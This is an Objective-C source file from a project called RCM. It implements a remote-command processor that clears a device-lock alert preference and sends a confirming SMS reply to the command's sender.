//
//  SetUnlockDeviceProcessor.m
//  RCM
//
//  Created by Makara Khloth on 6/22/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SetUnlockDeviceProcessor.h"
#import "PrefDeviceLock.h"

@interface SetUnlockDeviceProcessor (private)
- (void) sendReplySMS: (NSString *) aMsg;
@end

@implementation SetUnlockDeviceProcessor

#pragma mark -
#pragma mark Initialize

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SetUnlockDeviceProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(SetUnlockDeviceProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"SetUnlockDeviceProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}
#pragma mark -
#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetUnlockDeviceProcessor
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"SetUnlockDeviceProcessor--->doProcessingCommand")
	id <PreferenceManager> preferenceManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	// -- Lock device
	PrefDeviceLock *prefDeviceLock = (PrefDeviceLock *)[preferenceManager preference:kAlert];
	[prefDeviceLock setMStartAlertLock:NO];
	// -- Notify the changes
	[preferenceManager savePreferenceAndNotifyChange:prefDeviceLock];
	
	// -- Send reply message
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *replyMessage = NSLocalizedString(@"kSetUnlockDeviceMSG", @"");
	replyMessage = [messageFormat stringByAppendingString:replyMessage];
	[self sendReplySMS:replyMessage];
}

#pragma mark -
#pragma mark Private methods

/**
 - Method name: sendReplySMS
 - Purpose: This method is invoked when checking and process is passed and need to reply response message 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) sendReplySMS: (NSString *) aMsg {
	DLog (@"SetUnlockDeviceProcessor--->sendReplySMS")	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aMsg];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aMsg];
	}
}

#pragma mark -
#pragma mark Memory management

/**
 - Method name: dealloc
 - Purpose: Memory management
 - Argument list and description: No argument
 - Return description: No Return Type 
 */

- (void) dealloc {
	[super dealloc];
}

@end
